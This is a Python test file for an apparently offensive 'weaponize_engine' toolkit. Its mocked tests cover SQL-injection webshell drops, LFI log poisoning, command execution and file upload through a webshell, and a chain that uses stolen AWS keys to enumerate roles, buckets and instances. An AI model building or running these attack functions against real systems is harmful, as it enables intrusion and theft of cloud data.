import re

import responses

from tools import weaponize_engine
from tools.weaponize_engine import (
    _upload_via_webshell,
    deploy_webshell_lfi,
    run_command_via_webshell,
    sqli_into_outfile,
    ssrf_to_aws_takeover,
)


def _session():
    import requests

    return requests.Session()


class TestSqliOutfile:
    @responses.activate
    def test_detects_webshell(self):
        responses.add(
            responses.GET,
            re.compile(r"http://t\.test/exec\?id=1/shell\.php\?c=id"),
            body="uid=1000(user) gid=1000(user) groups=1000(user)",
            status=200,
        )
        responses.add(
            responses.GET,
            re.compile(r"http://t\.test/exec\?id=.*"),
            body="<html>ok</html>",
            status=200,
        )
        r = sqli_into_outfile("http://t.test/exec?id=1", "id", _session())
        assert r["success"] is True
        assert r["method"] == "sqli_outfile"
        assert r["webshell_url"]
        assert r["evidence"]

    @responses.activate
    def test_no_shell(self):
        responses.add(
            responses.GET,
            re.compile(r"http://t\.test/exec\?id=.*"),
            body="<html>ok</html>",
            status=200,
        )
        responses.add(
            responses.GET,
            re.compile(r"http://t\.test/.*shell.*"),
            body="<html>ok</html>",
            status=200,
        )
        r = sqli_into_outfile("http://t.test/exec?id=1", "id", _session())
        assert r["success"] is False

    @responses.activate
    def test_exception_handled(self):
        responses.add(
            responses.GET,
            re.compile(r".*"),
            body=Exception("conn refused"),
            status=200,
        )
        r = sqli_into_outfile("http://t.test/exec?id=1", "id", _session())
        assert r["success"] is False


class TestDeployLfi:
    @responses.activate
    def test_log_poison(self):
        responses.add(
            responses.GET,
            url="http://t.test/read?file=/tmp/x",
            body="<html>ok</html>",
            status=200,
        )
        responses.add(
            responses.GET,
            re.compile(r"http://t\.test/read\?file=/var/log/.*"),
            body="PHP Warning: system(): uid=1000(user) www-data",
            status=200,
        )
        r = deploy_webshell_lfi("http://t.test/read?file=/tmp/x", "file", _session())
        assert r["success"] is True
        assert r["method"] == "log_poison"


class TestWebshell:
    @responses.activate
    def test_run_command_get(self):
        responses.add(
            responses.GET,
            re.compile(r"http://t\.test/shell\.php\?c=.*"),
            body="root:x:0:0",
            status=200,
        )
        r = run_command_via_webshell("http://t.test/shell.php", "id", _session())
        assert r["success"] is True
        assert "root" in r["output"]

    @responses.activate
    def test_run_command_post_fallback(self):
        responses.add(
            responses.GET,
            re.compile(r"http://t\.test/shell\.php\?c=.*"),
            body="",
            status=200,
        )
        responses.add(
            responses.POST,
            re.compile(r"http://t\.test/shell\.php"),
            body="posted output",
            status=200,
        )
        r = run_command_via_webshell("http://t.test/shell.php", "id", _session())
        assert r["success"] is True
        assert r["output"] == "posted output"

    @responses.activate
    def test_run_command_failure(self):
        responses.add(
            responses.GET,
            re.compile(r"http://t\.test/shell\.php\?c=.*"),
            body="",
            status=403,
        )
        responses.add(
            responses.POST,
            re.compile(r"http://t\.test/shell\.php"),
            body="",
            status=403,
        )
        r = run_command_via_webshell("http://t.test/shell.php", "id", _session())
        assert r["success"] is False

    @responses.activate
    def test_upload_via_webshell(self, tmp_path):
        local = tmp_path / "pwn.sh"
        local.write_text("#!/bin/sh\necho hi\n", encoding="utf-8")
        responses.add(
            responses.GET,
            re.compile(r"http://t\.test/shell\.php\?c=.*"),
            body="-rw-r--r-- 1 root root 15 /tmp/pwn.sh",
            status=200,
        )
        ok = _upload_via_webshell(
            "http://t.test/shell.php", str(local), "/tmp/pwn.sh", _session(), 5.0
        )
        assert ok is True

    @responses.activate
    def test_upload_missing_file(self, tmp_path):
        ok = _upload_via_webshell(
            "http://t.test/shell.php", str(tmp_path / "nope.txt"), "/tmp/x", _session(), 5.0
        )
        assert ok is False


class _R:
    def __init__(self, code, out):
        self.returncode = code
        self.stdout = out
        self.stderr = ""


class TestAwsTakeover:
    def test_full_chain(self, monkeypatch):
        def fake_run(cmd_list, **kwargs):
            sub = cmd_list[1] if len(cmd_list) > 1 else ""
            if sub == "sts":
                return _R(0, '{"Arn": "arn:aws:iam::123456789012:user/admin"}')
            if sub == "iam":
                return _R(0, '{"Roles": [{"RoleName": "r1"}]}')
            if sub == "s3":
                if "s3://" in " ".join(cmd_list[2:]):
                    if "cp" in cmd_list:
                        return _R(0, "SECRETKEYDATA")
                    return _R(0, "2024-01-01 12:00:00     12 my-bucket/secret.txt\n")
                return _R(0, "2024-01-01 12:00:00     12 my-bucket\n")
            if sub == "ec2":
                return _R(
                    0,
                    '{"Reservations": [{"Instances": [{"InstanceId": "i-123",'
                    ' "InstanceType": "t3.micro", "State": {"Name": "running"},'
                    ' "PublicIpAddress": "1.2.3.4", "PrivateIpAddress": "10.0.0.1"}]}]}',
                )
            return _R(0, "")

        monkeypatch.setattr(weaponize_engine.subprocess, "run", fake_run)
        r = ssrf_to_aws_takeover("AKIAEXAMPLE", "secret")
        assert r["success"] is True
        assert r["access"]["caller_identity"]["Arn"]
        assert r["access"]["roles_count"] == 1
        assert r["access"]["buckets"] == ["2024-01-01 12:00:00     12 my-bucket"]
        assert len(r["access"]["ec2_instances"]) == 1

    def test_cli_not_found(self, monkeypatch):
        def fake_run(cmd_list, **kwargs):
            raise FileNotFoundError("aws")

        monkeypatch.setattr(weaponize_engine.subprocess, "run", fake_run)
        r = ssrf_to_aws_takeover("AKIAEXAMPLE", "secret")
        assert r["success"] is False
        assert r.get("error")
